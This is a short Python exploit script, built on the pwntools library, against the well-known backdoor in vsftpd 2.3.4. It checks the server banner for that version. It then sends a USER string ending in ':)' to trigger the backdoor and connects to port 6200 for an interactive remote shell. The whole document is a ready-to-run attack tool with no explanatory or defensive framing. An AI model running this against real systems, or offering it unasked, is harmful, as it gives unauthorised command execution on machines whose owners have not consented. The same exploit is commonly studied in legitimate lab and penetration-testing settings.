#!/usr/bin/python3

from pwn import *
from time import sleep
from sys import exit,argv

class ExploitFTP:
	def __init__(self,ip,port=21):
		self.ip = ip
		self.port = port
		self.p = log.progress("")

	def check_version(self):
		self.p.status("Checking vsftpd Version...")
		io = remote(self.ip, self.port)
		io.recvuntil(b"vsFTPd ")
		version = (io.recvuntil(b")")[:-1]).decode()
		io.close()
		if version != '2.3.4':
			self.p.failure("vsftpd 2.3.4 Not Found!")
			exit()

	def trigger_backdoor(self):
		self.p.status("Triggering Backdoor...")
		io = remote(self.ip, self.port)
		io.sendline(b"USER pwn:)")
		io.sendline(b"PASS hacked")
		self.p.status("Backdoor Triggered!")
		io.close()

	def get_shell(self):
		self.p.status("Connecting To Backdoor...")
		sleep(1)
		io = remote(self.ip, 6200)
		self.p.success("Got Shell!!!")
		io.interactive()
		io.close()

if __name__ == "__main__":
	if len(sys.argv) < 2 or len(sys.argv) > 3:
		error(f"Usage : {sys.argv[0]} IP PORT(optional)")

	if len(sys.argv) == 3:
		exploit = ExploitFTP(sys.argv[1],sys.argv[2])
	else:
		exploit = ExploitFTP(sys.argv[1])

	exploit.check_version()
	exploit.trigger_backdoor()
	exploit.get_shell()
